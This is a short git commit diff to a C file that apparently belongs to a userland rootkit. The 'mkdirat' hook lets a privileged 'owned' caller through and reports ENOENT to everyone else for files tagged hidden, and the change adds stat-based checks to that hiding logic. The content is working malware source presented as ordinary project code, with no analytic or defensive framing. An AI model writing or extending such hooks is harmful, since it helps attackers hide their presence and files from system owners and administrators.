4e442b0f317b44a3bfbe70f4ba143e4cdd5e1f1a
blank <mempodippy@users.noreply.github.com>
2017-01-10 10:26:04 +0000

    Update mkdirat.c

--- symbols/dir/mkdirat.c
+++ symbols/dir/mkdirat.c
@@ -8,7 +8,7 @@ int mkdirat(int dirfd, const char *pathname, mode_t mode)
 
     if(owned()) return old_mkdirat(dirfd, pathname, mode);
 
-    if(hidden_xattr(pathname) || hidden_fxattr(dirfd)) { errno = ENOENT; return -1; }
+    if(hidden_xattr(pathname) || hidden_fxattr(dirfd) || hidden_xstat(_STAT_VER, pathname, 32) || hidden_fxstat(_STAT_VER, dirfd, 32)) { errno = ENOENT; return -1; }
 
     return old_mkdirat(dirfd, pathname, mode);
 }
